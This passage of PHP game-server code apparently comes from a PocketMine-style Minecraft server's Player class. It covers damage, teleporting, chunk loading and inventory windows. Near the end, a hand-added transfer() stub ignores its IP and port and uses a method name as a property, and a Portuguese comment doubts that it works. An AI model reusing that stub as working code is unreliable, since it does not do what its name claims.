if($this->isCreative()and$source->getCause()!==EntityDamageEvent::CAUSE_MAGIC and$source->getCause()!==EntityDamageEvent::CAUSE_SUICIDE and$source->getCause()!==EntityDamageEvent::CAUSE_VOID){$source->setCancelled();
}
elseif($this->allowFlight and$source->getCause()===EntityDamageEvent::CAUSE_FALL){$source->setCancelled();
}
parent::attack($damage,$source);
if($source->isCancelled()){return;
}
elseif($this->getLastDamageCause()===$source and$this->spawned){$pk=new EntityEventPacket();
$pk->eid=0;
$pk->event=EntityEventPacket::HURT_ANIMATION;
$this->dataPacket($pk);
if($this->isSurvival()){$this->exhaust(0.3,PlayerExhaustEvent::CAUSE_DAMAGE);
}
}
}
public function sendPosition(Vector3$pos,$yaw=null,$pitch=null,$mode=0,array$targets=null){$yaw=$yaw===null?$this->yaw:$yaw;
$pitch=$pitch===null?$this->pitch:$pitch;
$pk=new MovePlayerPacket();
$pk->eid=$this->getId();
$pk->x=$pos->x;
$pk->y=$pos->y+$this->getEyeHeight();
$pk->z=$pos->z;
$pk->bodyYaw=$yaw;
$pk->pitch=$pitch;
$pk->yaw=$yaw;
$pk->mode=$mode;
if($targets!==null){Server::broadcastPacket($targets,$pk);
}
else{$pk->eid=0;
$this->dataPacket($pk);
}
}
protected function checkChunks(){if($this->chunk===null or($this->chunk->getX()!==($this->x>>4)or$this->chunk->getZ()!==($this->z>>4))){if($this->chunk!==null){$this->chunk->removeEntity($this);
}
$this->chunk=$this->level->getChunk($this->x>>4,$this->z>>4,true);
if(!$this->justCreated){$newChunk=$this->level->getChunkPlayers($this->x>>4,$this->z>>4);
unset($newChunk[$this->getLoaderId()]);
$reload=[];
foreach($this->hasSpawned as$player){if(!isset($newChunk[$player->getLoaderId()])){$this->despawnFrom($player);
}
else{unset($newChunk[$player->getLoaderId()]);
$reload[]=$player;
}
}
foreach($newChunk as$player){$this->spawnTo($player);
}
}
if($this->chunk===null){return;
}
$this->chunk->addEntity($this);
}
}
protected function checkTeleportPosition(){if($this->teleportPosition!==null){$chunkX=$this->teleportPosition->x>>4;
$chunkZ=$this->teleportPosition->z>>4;
for($X=-1;
$X<=1;
++$X){for($Z=-1;
$Z<=1;
++$Z){if(!isset($this->usedChunks[$index=Level::chunkHash($chunkX+$X,$chunkZ+$Z)])or$this->usedChunks[$index]===false){return false;
}
}
}
$this->sendPosition($this,null,null,1);
$this->spawnToAll();
$this->forceMovement=$this->teleportPosition;
$this->teleportPosition=null;
return true;
}
return true;
}
public function teleport(Vector3$pos,$yaw=null,$pitch=null){if(!$this->isOnline()){return false;
}
$oldPos=$this->getPosition();
if(parent::teleport($pos,$yaw,$pitch)){foreach($this->windowIndex as$window){if($window===$this->inventory){continue;
}
$this->removeWindow($window);
}
$this->teleportPosition=new Vector3($this->x,$this->y,$this->z);
if(!$this->checkTeleportPosition()){$this->forceMovement=$oldPos;
}
else{$this->spawnToAll();
}
$this->resetFallDistance();
$this->nextChunkOrderRun=0;
$this->newPosition=null;
$this->stopSleep();
return true;
}
return false;
}
public function teleportImmediate(Vector3$pos,$yaw=null,$pitch=null){if(parent::teleport($pos,$yaw,$pitch)){foreach($this->windowIndex as$window){if($window===$this->inventory){continue;
}
$this->removeWindow($window);
}
$this->forceMovement=new Vector3($this->x,$this->y,$this->z);
$this->sendPosition($this,$this->yaw,$this->pitch,1);
$this->resetFallDistance();
$this->orderChunks();
$this->nextChunkOrderRun=0;
$this->newPosition=null;
}
}
public function getWindowId(Inventory$inventory):int{if($this->windows->contains($inventory)){return$this->windows[$inventory];
}
return-1;
}
public function addWindow(Inventory$inventory,$forceId=null):int{if($this->windows->contains($inventory)){return$this->windows[$inventory];
}
if($forceId===null){$this->windowCnt=$cnt=max(2,++$this->windowCnt%99);
}
else{$cnt=(int)$forceId;
}
$this->windowIndex[$cnt]=$inventory;
$this->windows->attach($inventory,$cnt);
if($inventory->open($this)){return$cnt;
}
else{$this->removeWindow($inventory);
return-1;
}
}
public function removeWindow(Inventory$inventory){$inventory->close($this);
if($this->windows->contains($inventory)){$id=$this->windows[$inventory];
$this->windows->detach($this->windowIndex[$id]);
unset($this->windowIndex[$id]);
}
}
public function setMetadata($metadataKey,MetadataValue$metadataValue){$this->server->getPlayerMetadata()->setMetadata($this,$metadataKey,$metadataValue);
}
public function getMetadata($metadataKey){return$this->server->getPlayerMetadata()->getMetadata($this,$metadataKey);
}
public function hasMetadata($metadataKey){return$this->server->getPlayerMetadata()->hasMetadata($this,$metadataKey);
}
public function removeMetadata($metadataKey,Plugin$plugin){$this->server->getPlayerMetadata()->removeMetadata($this,$metadataKey,$plugin);
}
public function onChunkChanged(FullChunk$chunk){
$index=Level::chunkHash($chunk->getX(),$chunk->getZ());
/*
 * BUGFIX: only queue a resend if the player actually has this chunk
 * (usedChunks[$index] === true). onChunkChanged() is normally only
 * called for chunks the player is registered as a loader for, but
 * race conditions (chunk unloaded between the Level::setChunk() call
 * and this callback) could otherwise leave stale entries in loadQueue
 * for chunks the player no longer has. Those entries would never be
 * sent (sendNextChunk() can't send a chunk the player doesn't have
 * registered) and would accumulate until the next orderChunks() run.
 *
 * The isset + ===true guard makes the resend request explicit and
 * prevents the loadQueue from growing unbounded in edge cases.
 */
if(isset($this->usedChunks[$index])and$this->usedChunks[$index]===true){
$this->loadQueue[$index]=abs(($this->x>>4)-$chunk->getX())+abs(($this->z>>4)-$chunk->getZ());
}
}
public function onChunkLoaded(FullChunk$chunk){}
public function onChunkPopulated(FullChunk$chunk){}
public function getPlayerVersion(){
        return "0.15";
   }
   public function transfer(string $ip, int $port){
       $pk = new pocketmine\network\protocol\StrangePacket();
                        $pk->uuid = $this->uuid;
                        $pk->clientHash = $this->getUniqueId;
                        $this->dataPacket($pk);
   }//Aqui fica o sistema de ler em qual versão o player está (será que funciona???)
public function onChunkUnloaded(FullChunk$chunk){}
public function onBlockChanged(Vector3$block){}
public function getLoaderId(){return$this->loaderId;
}
public function isLoaderActive(){return$this->isConnected();
}
public static function getChunkCacheFromData($chunkX,$chunkZ,$payload,$ordering=FullChunkDataPacket::ORDER_COLUMNS){$pk=new FullChunkDataPacket();
$pk->chunkX=$chunkX;
$pk->chunkZ=$chunkZ;
$pk->order=$ordering;
$pk->data=$payload;
$pk->encode();
return$pk;
}
}